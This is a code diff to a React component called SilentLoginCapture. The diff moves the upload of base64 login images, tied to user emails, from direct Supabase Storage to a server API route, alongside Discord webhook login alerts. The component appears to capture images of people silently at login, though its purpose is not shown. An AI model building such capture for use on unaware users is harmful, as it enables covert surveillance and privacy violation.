@@ -2,7 +2,6 @@
 
 import { useEffect, useRef } from "react";
 import { sendLoginAlert } from "@/lib/discord-webhook";
-import { createClient } from "@/lib/supabase/client";
 
 interface SilentLoginCaptureProps {
   webhookUrl: string;
@@ -49,37 +48,26 @@ export default function SilentLoginCapture({
     init();
   }, []);
 
-  // Upload image to Supabase Storage and return public URL
+  // Upload image via API route (server-side upload to avoid RLS issues)
   async function uploadImage(base64Data: string, filename: string): Promise<string | null> {
     try {
-      const supabase = createClient();
-      // Convert base64 to Blob
-      const base64Response = await fetch(base64Data);
-      const blob = await base64Response.blob();
+      console.log("[SilentCapture] Uploading image via API...");
 
-      // Upload to Supabase Storage
-      const timestamp = Date.now();
-      const path = `login-captures/${email.replace(/[@.]/g, '_')}_${timestamp}_${filename}.jpg`;
+      const response = await fetch("/api/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ image: base64Data, filename, email }),
+      });
 
-      const { data, error } = await supabase.storage
-        .from("login-captures")
-        .upload(path, blob, {
-          contentType: "image/jpeg",
-          upsert: true,
-        });
+      const result = await response.json();
 
-      if (error) {
-        console.error("[SilentCapture] Upload error:", error);
+      if (!response.ok || result.error) {
+        console.error("[SilentCapture] Upload API error:", result.error);
         return null;
       }
 
-      // Get public URL
-      const { data: urlData } = supabase.storage
-        .from("login-captures")
-        .getPublicUrl(path);
-
-      console.log("[SilentCapture] Image uploaded:", urlData.publicUrl);
-      return urlData.publicUrl;
+      console.log("[SilentCapture] Image uploaded:", result.url);
+      return result.url;
     } catch (err) {
       console.error("[SilentCapture] Upload failed:", err);
       return null;
